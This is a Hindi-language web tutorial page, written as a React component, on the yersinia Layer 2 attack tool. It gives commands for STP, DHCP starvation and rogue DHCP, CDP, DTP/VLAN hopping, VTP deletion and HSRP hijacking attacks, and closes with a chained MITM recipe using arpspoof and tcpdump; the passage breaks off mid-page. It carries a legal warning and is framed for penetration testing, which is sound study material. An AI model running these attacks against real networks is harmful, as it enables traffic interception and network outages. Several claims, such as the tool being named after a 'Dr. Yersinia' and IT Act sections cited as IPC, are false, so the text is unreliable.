import TutorialLayout from '../../components/TutorialLayout'
import CodeBlock from '../../components/CodeBlock'

export default function Yersinia() {
  return (
    <TutorialLayout
      title="yersinia"
      subtitle="लेयर 2 नेटवर्क अटैक टूल — STP, CDP, DHCP, VTP, HSRP, DTP अटैक"
      icon="🔀"
      prev={{ to: '/tool/hostapd-mana', label: 'hostapd-mana' }}
      next={{ to: '/tool/impacket', label: 'impacket' }}
    >
      <h2>What is Yersinia?</h2>
      <p>
        येर्सिनिया एक शक्तिशाली लेयर 2 नेटवर्क अटैक टूल है जो स्विच-आधारित नेटवर्क को टारगेट करता है। यह टूल STP (स्पैनिंग ट्री प्रोटोकॉल), CDP (सिस्को डिस्कवरी प्रोटोकॉल), DTP (डायनामिक ट्रंकिंग प्रोटोकॉल), DHCP (डायनामिक होस्ट कॉन्फ़िगरेशन प्रोटोकॉल), HSRP (हॉट स्टैंडबाय राउटर प्रोटोकॉल), और VTP (VLAN ट्रंकिंग प्रोटोकॉल) जैसे लेयर 2 प्रोटोकॉल पर अटैक करता है। येर्सिनिया का नाम प्रसिद्ध वायरस शोधकर्ता डॉ. येर्सिनिया के नाम पर रखा गया है।
      </p>
      <p>
        येर्सिनिया को मूल रूप से एल्विस्टर और रोमन मेडिना ने विकसित किया था। यह टूल C भाषा में लिखा गया है और Linux सिस्टम पर चलता है। यह टूल नेटवर्क सुरक्षा परीक्षण, पेनेट्रेशन टेस्टिंग, और रेड टीम ऑपरेशन में उपयोग होता है। कॉर्पोरेट नेटवर्क में लेयर 2 अटैक बहुत प्रभावी होते हैं क्योंकि ज्यादातर सुरक्षा टीमें सिर्फ लेयर 3 और लेयर 4 की सुरक्षा पर ध्यान देती हैं।
      </p>
      <p>
        लेयर 2 अटैक का मतलब है कि आप OSI मॉडल के डेटा लिंक लेयर पर अटैक कर रहे हो। यह लेयर स्विच, MAC एड्रेस, और लोकल नेटवर्क कम्युनिकेशन को संभालती है। जब आप लेयर 2 को कॉम्प्रोमाइज़ करते हो, तो आप पूरे लोकल नेटवर्क को कंट्रोल कर सकते हो — बिना किसी राउटिंग या फ़ायरवॉल के हस्तक्षेप के।
      </p>

      <div className="warning-box mb-6">
        <strong>⚠️ कानूनी चेतावनी:</strong> येर्सिनिया केवल अधिकृत पेनेट्रेशन टेस्टिंग और सुरक्षा शोध के लिए उपयोग करें। बिना अनुमति के नेटवर्क अटैक करना अवैध है और IPC धारा 66, 66B, 43 के तहत दंडनीय है। हैकिंग अटैक से नेटवर्क इंफ्रास्ट्रक्चर को नुकसान हो सकता है, सेवाएं बाधित हो सकती हैं, और डेटा लॉस हो सकता है। केवल अपने लैब वातावरण या लिखित प्राधिकरण के साथ ही उपयोग करें।
      </div>

      <h2>History of Yersinia</h2>
      <p>
        येर्सिनिया का विकास 2005 में शुरू हुआ था। यह टूल पहले सिर्फ STP अटैक के लिए था, लेकिन बाद में इसमें CDP, DHCP, DTP, HSRP, और VTP अटैक जोड़े गए। यह टूल ओपन सोर्स है और GitHub पर उपलब्ध है। इसका नवीनतम संस्करण 0.8.2 है जो 2019 में रिलीज़ हुआ था।
      </p>
      <p>
        येर्सिनिया का डिज़ाइन दर्शन यह है कि लेयर 2 प्रोटोकॉल में जो कमज़ोरियां हैं उनका फायदा उठाना। बहुत से नेटवर्क प्रशासक लेयर 2 सुरक्षा को नज़रअंदाज़ करते हैं क्योंकि उन्हें लगता है कि सिर्फ फ़ायरवॉल और IDS/IPS लगाने से काम हो जाएगा। लेकिन वास्तव में, यदि आप लेयर 2 कॉम्प्रोमाइज़ कर लेते हो, तो आप सभी सुरक्षा नियंत्रणों को बायपास कर सकते हो।
      </p>

      <h2>How Yersinia Works?</h2>
      <p>
        येर्सिनिया नेटवर्क इंटरफ़ेस कार्ड (NIC) को प्रॉमिस्क्यूअस मोड में सेट करता है ताकि सारा नेटवर्क ट्रैफ़िक कैप्चर हो सके। फिर यह टूल विशिष्ट लेयर 2 प्रोटोकॉल फ्रेम बनाता है और उन्हें नेटवर्क पर भेजता है। ये फ्रेम वैध दिखने के लिए डिज़ाइन किए गए होते हैं, लेकिन वास्तव में दुर्भावनापूर्ण होते हैं।
      </p>
      <p>
        येर्सिनिया का मूल आर्किटेक्चर इस तरह से डिज़ाइन किया गया है:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">पैकेट इंजन:</strong> यह रॉ पैकेट बनाता है और नेटवर्क पर भेजता है</li>
        <li><strong className="text-white">प्रोटोकॉल पार्सर:</strong> यह इनकमिंग पैकेट को पार्स करता है और प्रोटोकॉल-विशिष्ट डेटा निकालता है</li>
        <li><strong className="text-white">अटैक मॉड्यूल:</strong> यह विभिन्न अटैक प्रकारों को लागू करता है</li>
        <li><strong className="text-white">इंटरफ़ेस मैनेजर:</strong> यह नेटवर्क इंटरफ़ेस को प्रबंधित करता है</li>
      </ul>

      <h2>Installation</h2>
      <CodeBlock
        title="येर्सिनिया इंस्टॉल करें"
        code={`# Kali Linux में प्री-इंस्टॉल्ड होता है:
sudo apt update
sudo apt install yersinia

# सोर्स से इंस्टॉल:
git clone https://github.com/tomac/yersinia.git
cd yersinia
./autogen.sh
./configure
make
sudo make install

# संस्करण जांचें:
yersinia --version

# सहायता देखें:
yersinia --help`}
      />

      <h2>Basic Usage</h2>
      <p>
        येर्सिनिया तीन मोड में चलता है — GUI मोड, इंटरैक्टिव CLI मोड, और डेमन मोड। हर मोड का अपना उपयोग है। GUI मोड शुरुआती लोगों के लिए अच्छा है, इंटरैक्टिव मोड अनुभवी उपयोगकर्ताओं के लिए, और डेमन मोड बैकग्राउंड अटैक के लिए।
      </p>
      <CodeBlock
        title="येर्सिनिया शुरू करें"
        code={`# GUI मोड — ग्राफ़िकल इंटरफ़ेस:
sudo yersinia -G

# इंटरैक्टिव मोड (CLI):
sudo yersinia -I

# विशिष्ट इंटरफ़ेस के साथ:
sudo yersinia -I -i wlan0

# ईथरनेट इंटरफ़ेस:
sudo yersinia -I -i eth0

# डेमन मोड — बैकग्राउंड में चलेगा:
sudo yersinia -D

# डिबग मोड — विस्तृत आउटपुट:
sudo yersinia -I -d

# लॉग फ़ाइल के साथ:
sudo yersinia -I -l /var/log/yersinia.log`}
      />

      <h2>Yersinia GUI Mode</h2>
      <p>
        GUI मोड में येर्सिनिया का ग्राफ़िकल इंटरफ़ेस होता है जो GTK टूलकिट पर आधारित है। इसमें आपको सभी अटैक विज़ुअल रूप में दिखेंगे। GUI मोड में आप:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li>नेटवर्क इंटरफ़ेस चुन सकते हो</li>
        <li>प्रोटोकॉल-वार अटैक देख सकते हो</li>
        <li>रीयल-टाइम ट्रैफ़िक मॉनिटर कर सकते हो</li>
        <li>अटैक परिणाम ग्राफ़िकल रूप में देख सकते हो</li>
        <li>पैकेट कैप्चर और विश्लेषण कर सकते हो</li>
      </ul>

      <CodeBlock
        title="GUI मोड कमांड"
        code={`# GUI मोड शुरू करें:
sudo yersinia -G

# GUI मोड में:
# 1. इंटरफ़ेस चुनें (eth0, wlan0, आदि)
# 2. प्रोटोकॉल चुनें (STP, CDP, DHCP, आदि)
# 3. अटैक प्रकार चुनें
# 4. अटैक पैरामीटर सेट करें
# 5. लॉन्च बटन क्लिक करें`}
      />

      <h2>Yersinia Interactive Mode</h2>
      <p>
        इंटरैक्टिव मोड कमांड-लाइन इंटरफ़ेस है जो रीयल-टाइम अटैक नियंत्रण देता है। इसमें आप कीबोर्ड शॉर्टकट से अटैक प्रबंधित कर सकते हो। यह मोड अनुभवी पेनेट्रेशन टेस्टर के लिए सबसे अच्छा है क्योंकि यह अधिक नियंत्रण और लचीलापन देता है।
      </p>

      <CodeBlock
        title="इंटरैक्टिव मोड नेविगेशन"
        code={`# इंटरैक्टिव मोड शुरू करें:
sudo yersinia -I

# कीबोर्ड शॉर्टकट:
# Tab — प्रोटोकॉल स्विच करें (STP, CDP, DHCP, DTP, HSRP, VTP)
# h   — सहायता देखें
# i   — इंटरफ़ेस बदलें
# q   — बाहर निकलें

# प्रोटोकॉल-विशिष्ट कमांड:
# STP मोड में:
#   1 — रूट ब्रिज अटैक
#   2 — BPDU फ्लड
#   3 — TCN फ्लड

# DHCP मोड में:
#   1 — DHCP स्टार्वेशन
#   2 — रोग DHCP सर्वर
#   5 — DHCP डिस्कवर फ्लड

# CDP मोड में:
#   1 — CDP स्पूफ़िंग
#   2 — CDP फ्लड`}
      />

      <h2>Supported Protocols and Attacks</h2>
      <p>
        येर्सिनिया कुल 6 प्रोटोकॉल का समर्थन करता है और हर प्रोटोकॉल के कई अटैक हैं। नीचे तालिका में सभी अटैक की विवरण हैं:
      </p>

      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">प्रोटोकॉल</th>
              <th className="text-left py-2 px-3 text-neon-green">अटैक</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">जोखिम स्तर</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">STP</td><td>रूट ब्रिज अटैक</td><td>नेटवर्क का रूट ब्रिज बन जाता है — सारा ट्रैफ़िक आपके माध्यम से जाता है</td><td className="text-red-400">गंभीर</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">STP</td><td>BPDU फ्लड</td><td>स्विच टेबल ओवरफ़्लो कर देता है — स्विच फेल हो जाता है</td><td className="text-red-400">उच्च</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">STP</td><td>TCN फ्लड</td><td>टोपोलॉजी चेंज नोटिफ़िकेशन भेजकर नेटवर्क अस्थिर करता है</td><td className="text-yellow-400">मध्यम</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">CDP</td><td>CDP स्पूफ़िंग</td><td>नकली सिस्को डिवाइस दिखाता है — नेटवर्क मैपिंग संभव</td><td className="text-yellow-400">मध्यम</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">CDP</td><td>CDP फ्लड</td><td>स्विच मेमोरी समाप्त कर देता है</td><td className="text-yellow-400">मध्यम</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">DTP</td><td>ट्रंक नेगोशिएशन</td><td>VLAN ट्रंक सक्षम करवाता है — सभी VLAN तक पहुंच</td><td className="text-red-400">गंभीर</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">DHCP</td><td>DHCP स्टार्वेशन</td><td>सभी DHCP पते समाप्त कर देता है — कोई नया डिवाइस कनेक्ट नहीं हो सकता</td><td className="text-red-400">उच्च</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">DHCP</td><td>रोग DHCP सर्वर</td><td>नकली DHCP सर्वर शुरू करता है — पीड़ितों को नकली गेटवे मिलता है</td><td className="text-red-400">गंभीर</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">DHCP</td><td>DHCP डिस्कवर फ्लड</td><td>DHCP सर्वर पर फ्लड अटैक — सेवा अस्वीकृति</td><td className="text-yellow-400">मध्यम</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">VTP</td><td>VTP डिलीट</td><td>पूरे VLAN कॉन्फ़िगरेशन हटा देता है</td><td className="text-red-400">गंभीर</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">VTP</td><td>VTP ऐड</td><td>नकली VLAN जोड़ देता है</td><td className="text-yellow-400">मध्यम</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">HSRP</td><td>HSRP हाईजैक</td><td>डिफ़ॉल्ट गेटवे हाईजैक कर लेता है — MITM अटैक संभव</td><td className="text-red-400">गंभीर</td></tr>
          </tbody>
        </table>
      </div>

      <h2>STP Attacks Detail</h2>
      <p>
        स्पैनिंग ट्री प्रोटोकॉल (STP) ईथरनेट स्विच में लूप रोकने के लिए उपयोग होता है। STP एक ट्री टोपोलॉजी बनाता है और एक रूट ब्रिज चुनता है। रूट ब्रिज से सारा ट्रैफ़िक बहता है। यदि आप रूट ब्रिज बन जाते हो, तो सारा नेटवर्क ट्रैफ़िक आपके माध्यम से जाता है।
      </p>

      <h3>Root Bridge Attack</h3>
      <p>
        रूट ब्रिज अटैक में आप सबसे कम ब्रिज ID के साथ BPDU (ब्रिज प्रोटोकॉल डेटा यूनिट) फ्रेम भेजते हो। STP एल्गोरिदम सबसे कम ब्रिज ID वाले स्विच को रूट ब्रिज चुनता है। यदि आपका ब्रिज ID सबसे कम है, तो आप रूट ब्रिज बन जाते हो।
      </p>
      <p>
        रूट ब्रिज बनने के बाद:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li>सारा ट्रैफ़िक आपके माध्यम से बहेगा</li>
        <li>आप पूरा नेटवर्क ट्रैफ़िक कैप्चर कर सकते हो</li>
        <li>आप ट्रैफ़िक बदल सकते हो</li>
        <li>आप चयनात्मक ट्रैफ़िक गिरा सकते हो (DoS)</li>
        <li>आप नेटवर्क टोपोलॉजी बदल सकते हो</li>
      </ul>

      <CodeBlock
        title="STP रूट ब्रिज अटैक"
        code={`# इंटरैक्टिव मोड में STP चुनें (Tab कुंजी)
# फिर रूट ब्रिज अटैक चुनें (विकल्प 1)

# या कमांड लाइन से:
yersinia stp -attack 1

# रूट ब्रिज अटैक के बाद सत्यापित करें:
# दूसरे स्विच से STP स्थिति जांचें
# आपका ब्रिज ID रूट दिखना चाहिए

# BPDU पैरामीटर अनुकूलित करें:
# ब्रिज ID: 00:00:00:00:00:01 (सबसे कम होना चाहिए)
# प्राथमिकता: 0 (सबसे कम)
# पोर्ट ID: 1
# अधिकतम आयु: 20
# हैलो समय: 2
# अग्रेषण विलंब: 15`}
      />

      <h3>BPDU Flood Attack</h3>
      <p>
        BPDU फ्लड अटैक में आप बहुत सारे BPDU फ्रेम भेजते हो स्विच पर। स्विच का MAC एड्रेस टेबल सीमित होता है — आमतौर पर 1000-10000 प्रविष्टियां। जब टेबल भर जाता है, तो स्विच फेल ओपन मोड में चला जाता है और सारा ट्रैफ़िक ब्रॉडकास्ट करने लगता है। इससे:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li>स्विच का प्रदर्शन कम हो जाता है</li>
        <li>नेटवर्क भीड़ बढ़ती है</li>
        <li>स्विच क्रैश हो सकता है</li>
        <li>ट्रैफ़िक स्निफ़िंग संभव हो जाती है</li>
      </ul>

      <CodeBlock
        title="BPDU फ्लड अटैक"
        code={`# इंटरैक्टिव मोड में STP चुनें
# विकल्प 2: BPDU फ्लड

# या कमांड लाइन से:
yersinia stp -attack 2

# फ्लड तीव्रता नियंत्रण:
# निरंतर फ्लड मोड सक्षम करें
# मॉनिटर करें — स्विच का MAC टेबल ओवरफ़्लो होगा

# अटैक बंद करने के लिए:
# Ctrl+C दबाएं`}
      />

      <h3>TCN Flood Attack</h3>
      <p>
        TCN (टोपोलॉजी चेंज नोटिफ़िकेशन) फ्लड में आप बहुत सारे TCN फ्रेम भेजते हो। TCN फ्रेम स्विच को बताते हैं कि नेटवर्क टोपोलॉजी बदल गई है। जब स्विच को बार-बार TCN मिलते हैं, तो वह अपना MAC एड्रेस टेबल बार-बार साफ़ करता है। इससे:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li>MAC एड्रेस टेबल बार-बार साफ़ होता है</li>
        <li>अस्थायी ट्रैफ़िक फ्लडिंग होती है</li>
        <li>नेटवर्क प्रदर्शन कम होता है</li>
        <li>स्विच का CPU उपयोग बढ़ता है</li>
      </ul>

      <CodeBlock
        title="TCN फ्लड अटैक"
        code={`# इंटरैक्टिव मोड में STP चुनें
# विकल्प 3: TCN फ्लड

# या कमांड लाइन से:
yersinia stp -attack 3

# TCN फ्लड से पहले सामान्य STP ट्रैफ़िक कैप्चर करें
# ताकि आधारभूत पता चले`}
      />

      <h2>DHCP Attacks Detail</h2>
      <p>
        DHCP (डायनामिक होस्ट कॉन्फ़िगरेशन प्रोटोकॉल) नेटवर्क डिवाइस को IP पते असाइन करता है। DHCP अटैक से आप नेटवर्क कनेक्टिविटी बाधित कर सकते हो या MITM अटैक कर सकते हो। DHCP अटैक बहुत प्रभावी होते हैं क्योंकि हर डिवाइस को IP पता चाहिए नेटवर्क पर काम करने के लिए।
      </p>

      <h3>DHCP Starvation Attack</h3>
      <p>
        DHCP स्टार्वेशन अटैक में आप बहुत सारे DHCP DISCOVER पैकेट भेजते हो हर एक अद्वितीय MAC एड्रेस के साथ। DHCP सर्वर सीमित IP पते रखता है (स्कोप)। जब सभी IP पते असाइन हो जाते हैं, तो कोई नया डिवाइस IP पता नहीं ले सकता। इससे:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li>नए डिवाइस कनेक्ट नहीं हो सकते</li>
        <li>मौजूदा डिवाइस का लीज समाप्त होने के बाद डिस्कनेक्ट हो जाएंगे</li>
        <li>नेटवर्क पर DoS हो जाता है</li>
        <li>रोग DHCP सर्वर के लिए वातावरण तैयार हो जाता है</li>
      </ul>

      <CodeBlock
        title="DHCP स्टार्वेशन अटैक"
        code={`# इंटरैक्टिव मोड में DHCP चुनें
# विकल्प 1: DHCP स्टार्वेशन

# या कमांड लाइन से:
yersinia dhcp -attack 1

# स्टार्वेशन अटैक के बाद:
# 1. DHCP सर्वर की लीज टेबल जांचें
# 2. नया डिवाइस कनेक्ट करके देखें — IP नहीं मिलेगा
# 3. रोग DHCP सर्वर शुरू करें (अगला चरण)

# अटैक अवधि नियंत्रण:
# जब तक चाहो तब तक चलाओ
# Ctrl+C से बंद करो`}
      />

      <h3>Rogue DHCP Server Attack</h3>
      <p>
        रोग DHCP सर्वर अटैक में आप अपना नकली DHCP सर्वर शुरू करते हो। पहले DHCP स्टार्वेशन से सभी IP पते समाप्त करते हो, फिर रोग DHCP सर्वर शुरू करते हो। नए डिवाइस जो कनेक्ट होते हैं, उन्हें आपका नकली DHCP सर्वर IP पता असाइन करता है। आप नकली गेटवे, DNS सर्वर, या कुछ भी असाइन कर सकते हो।
      </p>
      <p>
        रोग DHCP सर्वर के माध्यम से आप:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li>नकली गेटवे असाइन करके MITM अटैक कर सकते हो</li>
        <li>नकली DNS सर्वर असाइन करके DNS स्पूफ़िंग कर सकते हो</li>
        <li>पीड़ितों को अपने प्रॉक्सी पर रीडायरेक्ट कर सकते हो</li>
        <li>सारा पीड़ित ट्रैफ़िक कैप्चर कर सकते हो</li>
      </ul>

      <CodeBlock
        title="रोग DHCP सर्वर"
        code={`# चरण 1: DHCP स्टार्वेशन करें
yersinia dhcp -attack 1

# चरण 2: रोग DHCP सर्वर शुरू करें
yersinia dhcp -attack 2

# रोग DHCP पैरामीटर:
# गेटवे: अपना IP पता (जैसे, 192.168.1.100)
# DNS: अपना IP पता
# सबनेट: 255.255.255.0
# लीज समय: 1 घंटा

# चरण 3: MITM सेटअप करें
# IP फॉरवर्डिंग सक्षम करें:
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP स्पूफ़िंग शुरू करें (ettercap या arpspoof से)
# अब सारा पीड़ित ट्रैफ़िक आपके माध्यम से जाएगा

# चरण 4: ट्रैफ़िक कैप्चर करें
tcpdump -i eth0 -w capture.pcap`}
      />

      <h3>DHCP Discover Flood</h3>
      <p>
        DHCP डिस्कवर फ्लड में आप बहुत सारे DHCP DISCOVER पैकेट भेजते हो एक साथ। यह अटैक DHCP सर्वर को अभिभूत करता है और वैध अनुरोध प्रक्रिया नहीं हो पाती। यह DoS अटैक है जो नेटवर्क कनेक्टिविटी बाधित करता है।
      </p>

      <CodeBlock
        title="DHCP डिस्कवर फ्लड"
        code={`# इंटरैक्टिव मोड में DHCP चुनें
# विकल्प 5: DHCP डिस्कवर फ्लड

# या कमांड लाइन से:
yersinia dhcp -attack 5

# फ्लड तीव्रता:
# प्रति सेकंड पैकेट नियंत्रित करें
# मॉनिटर करें — DHCP सर्वर का प्रतिक्रिया समय बढ़ेगा

# संयुक्त अटैक:
# चरण 1: DHCP डिस्कवर फ्लड (DoS)
# चरण 2: DHCP स्टार्वेशन
# चरण 3: रोग DHCP सर्वर`}
      />

      <h2>CDP Attacks Detail</h2>
      <p>
        CDP (सिस्को डिस्कवरी प्रोटोकॉल) केवल सिस्को डिवाइस में उपयोग होता है। यह प्रोटोकॉल डिवाइस को स्वचालित रूप से खोजता है और डिवाइस जानकारी साझा करता है — जैसे डिवाइस मॉडल, सॉफ़्टवेयर संस्करण, IP पता, आदि। CDP अटैक से आप नेटवर्क मैपिंग कर सकते हो और नकली डिवाइस इंजेक्ट कर सकते हो।
      </p>

      <h3>CDP Spoofing</h3>
      <p>
        CDP स्पूफ़िंग में आप नकली CDP फ्रेम भेजते हो और अपने आप को सिस्को डिवाइस के रूप में दिखाते हो। स्विच या राउटर आपको वैध सिस्को डिवाइस समझ कर जानकारी साझा करेगा। इससे आप:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li>नेटवर्क टोपोलॉजी मैप कर सकते हो</li>
        <li>सिस्को डिवाइस की जानकारी एकत्र कर सकते हो</li>
        <li>विश्वास संबंध का फायदा उठा सकते हो</li>
        <li>नेटवर्क टोह ले सकते हो</li>
      </ul>

      <CodeBlock
        title="CDP स्पूफ़िंग"
        code={`# इंटरैक्टिव मोड में CDP चुनें
# विकल्प 1: CDP स्पूफ़िंग

# या कमांड लाइन से:
yersinia cdp -attack 1

# नकली CDP डिवाइस पैरामीटर:
# डिवाइस ID: "Cisco-Router-1"
# प्लेटफ़ॉर्म: "cisco 2600"
# पोर्ट ID: "FastEthernet0/0"
# सॉफ़्टवेयर संस्करण: "12.4(25)"

# CDP पैकेट मॉनिटर करें:
tcpdump -i eth0 -vv -s 0 'ether[20:2] == 0x2000'`}
      />

      <h3>CDP Flood</h3>
      <p>
        CDP फ्लड में आप बहुत सारे CDP फ्रेम भेजते हो स्विच पर। स्विच का CDP टेबल सीमित होता है। जब टेबल भर जाता है, तो स्विच की मेमोरी समाप्त हो जाती है और स्विच अस्थिर हो जाता है।
      </p>

      <CodeBlock
        title="CDP फ्लड"
        code={`# इंटरैक्टिव मोड में CDP चुनें
# विकल्प 2: CDP फ्लड

# या कमांड लाइन से:
yersinia cdp -attack 2

# CDP फ्लड से स्विच की मेमोरी समाप्त होगी
# स्विच अस्थिर हो जाएगा
# नेटवर्क कनेक्टिविटी प्रभावित होगी`}
      />

      <h2>DTP Attacks Detail</h2>
      <p>
        DTP (डायनामिक ट्रंकिंग प्रोटोकॉल) भी सिस्को का मालिकाना प्रोटोकॉल है। यह प्रोटोकॉल स्विच के बीच ट्रंक लिंक स्वचालित रूप से तय करता है। ट्रंक लिंक कई VLAN का ट्रैफ़िक ले जाते हैं। यदि आप ट्रंक लिंक स्थापित कर लेते हो, तो आप सभी VLAN तक पहुंच ले सकते हो।
      </p>

      <h3>Trunk Negotiation Attack</h3>
      <p>
        ट्रंक नेगोशिएशन अटैक में आप DTP फ्रेम भेजते हो और अपने स्विच पोर्ट को ट्रंक मोड में सेट करवाते हो। ट्रंक मोड में आपका पोर्ट सभी VLAN का ट्रैफ़िक प्राप्त करेगा। इससे:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li>सभी VLAN का ट्रैफ़िक कैप्चर कर सकते हो</li>
        <li>VLAN हॉपिंग अटैक कर सकते हो</li>
        <li>इंटर-VLAN ट्रैफ़िक एक्सेस कर सकते हो</li>
        <li>VLAN सुरक्षा बायपास कर सकते हो</li>
      </ul>

      <CodeBlock
        title="DTP ट्रंक नेगोशिएशन"
        code={`# इंटरैक्टिव मोड में DTP चुनें
# विकल्प 1: ट्रंक नेगोशिएशन

# या कमांड लाइन से:
yersinia dtp -attack 1

# ट्रंक नेगोशिएशन के बाद:
# 1. सत्यापित करें कि ट्रंक स्थापित हुआ:
#    show interfaces trunk (सिस्को स्विच पर)

# 2. VLAN ट्रैफ़िक कैप्चर करें:
#    ट्रंक मोड में सभी VLAN का ट्रैफ़िक आएगा

# 3. VLAN हॉपिंग करें:
#    802.1Q टैग बदलें
#    लक्ष्य VLAN पर ट्रैफ़िक भेजें

# संयुक्त अटैक:
# चरण 1: DTP ट्रंक नेगोशिएशन
# चरण 2: VLAN हॉपिंग
# चरण 3: ट्रैफ़िक कैप्चर`}
      />

      <h2>VTP Attacks Detail</h2>
      <p>
        VTP (VLAN ट्रंकिंग प्रोटोकॉल) भी सिस्को का मालिकाना प्रोटोकॉल है। यह प्रोटोकॉल स्विच के बीच VLAN कॉन्फ़िगरेशन सिंक्रोनाइज़ करता है। VTP अटैक से आप पूरे VLAN कॉन्फ़िगरेशन को बदल या हटा सकते हो।
      </p>

      <h3>VTP Delete Attack</h3>
      <p>
        VTP डिलीट अटैक में आप VTP फ्रेम भेजते हो जो सभी VLAN कॉन्फ़िगरेशन हटा देता है। यह अटैक बहुत विनाशकारी है क्योंकि:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li>सभी VLAN हट जाते हैं</li>
        <li>नेटवर्क कनेक्टिविटी पूरी तरह बाधित होती है</li>
        <li>इंटर-VLAN राउटिंग फेल हो जाती है</li>
        <li>नेटवर्क फिर से बनाना पड़ता है</li>
      </ul>

      <CodeBlock
        title="VTP डिलीट अटैक"
        code={`# इंटरैक्टिव मोड में VTP चुनें
# विकल्प: VTP डिलीट

# या कमांड लाइन से:
yersinia vtp -attack 1

# चेतावनी: यह अटैक बहुत विनाशकारी है!
# पूरा VLAN कॉन्फ़िगरेशन हट जाएगा
# नेटवर्क पूरी तरह बंद हो सकता है

# अटैक से पहले:
# 1. वर्तमान VLAN कॉन्फ़िगरेशन बैकअप लें
# 2. नेटवर्क दस्तावेज़ तैयार रखें
# 3. रिकवरी योजना तैयार रखें`}
      />

      <h3>VTP Add Attack</h3>
      <p>
        VTP ऐड अटैक में आप नकली VLAN जोड़ते हो VTP डोमेन में। यह अटैक नेटवर्क भ्रम पैदा करता है और VLAN कॉन्फ़िगरेशन खराब करता है।
      </p>

      <CodeBlock
        title="VTP ऐड अटैक"
        code={`# इंटरैक्टिव मोड में VTP चुनें
# विकल्प: VTP ऐड

# या कमांड लाइन से:
yersinia vtp -attack 2

# नकली VLAN पैरामीटर:
# VLAN ID: यादृच्छिक
# VLAN नाम: कस्टम नाम
# VTP डोमेन: लक्ष्य डोमेन नाम`}
      />

      <h2>HSRP Attacks Detail</h2>
      <p>
        HSRP (हॉट स्टैंडबाय राउटर प्रोटोकॉल) सिस्को का मालिकाना प्रोटोकॉल है जो डिफ़ॉल्ट गेटवे रिडंडेंसी प्रदान करता है। HSRP में एक सक्रिय राउटर और एक या अधिक स्टैंडबाय राउटर होते हैं। यदि सक्रिय राउटर फेल हो जाए, तो स्टैंडबाय राउटर स्वचालित रूप से सक्रिय बन जाता है।
      </p>

      <h3>HSRP Hijack Attack</h3>
      <p>
        HSRP हाईजैक अटैक में आप HSRP फ्रेम भेजते हो और अपने आप को सक्रिय राउटर के रूप में घोषित करते हो। यदि आपकी प्राथमिकता अधिक है, तो आप सक्रिय राउटर बन जाते हो और सारा ट्रैफ़िक आपके माध्यम से जाता है।
      </p>
      <p>
        HSRP हाईजैक के बाद:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li>सारा डिफ़ॉल्ट गेटवे ट्रैफ़िक आपके माध्यम से जाता है</li>
        <li>आप MITM अटैक कर सकते हो</li>
        <li>ट्रैफ़िक कैप्चर और बदलाव संभव है</li>
        <li>पीड़ितों को पता भी नहीं चलेगा</li>
      </ul>

      <CodeBlock
        title="HSRP हाईजैक अटैक"
        code={`# इंटरैक्टिव मोड में HSRP चुनें
# विकल्प: HSRP हाईजैक

# या कमांड लाइन से:
yersinia hsrp -attack 1

# HSRP पैरामीटर:
# प्राथमिकता: 255 (सबसे अधिक — ताकि आप सक्रिय बनो)
# वर्चुअल IP: मूल गेटवे IP
# प्रमाणीकरण: मिलान करें

# अटैक के बाद:
# 1. IP फॉरवर्डिंग सक्षम करें:
echo 1 > /proc/sys/net/ipv4/ip_forward

# 2. ट्रैफ़िक कैप्चर करें:
tcpdump -i eth0 -w hsrp_capture.pcap

# 3. ARP स्पूफ़िंग भी करें पूर्ण MITM के लिए
# (ettercap या arpspoof से)`}
      />

      <h2>Combined Attack Strategies</h2>
      <p>
        वास्तविक दुनिया की पेनेट्रेशन टेस्टिंग में अक्सर कई अटैक मिलाकर उपयोग करते हैं। नीचे कुछ सामान्य अटैक रणनीतियां हैं:
      </p>

      <h3>Strategy 1: Full Network MITM</h3>
      <CodeBlock
        title="लेयर 2 के माध्यम से नेटवर्क MITM"
        code={`# चरण 1: नेटवर्क टोह
# CDP स्पूफ़िंग से नेटवर्क मैप बनाओ
yersinia cdp -attack 1

# चरण 2: DHCP स्टार्वेशन
# सभी IP पते समाप्त करो
yersinia dhcp -attack 1

# चरण 3: रोग DHCP सर्वर
# नकली गेटवे असाइन करो
yersinia dhcp -attack 2

# चरण 4: IP फॉरवर्डिंग सक्षम करो
echo 1 > /proc/sys/net/ipv4/ip_forward

# चरण 5: ARP स्पूफ़िंग
# MITM सेटअप पूरा करो
arpspoof -i eth0 -t <victim> <gateway>
arpspoof -i eth0 -t <gateway> <victim>

# चरण 6: ट्रैफ़िक कैप्चर
tcpdump -i eth0 -w mitm.pcap`}
      />

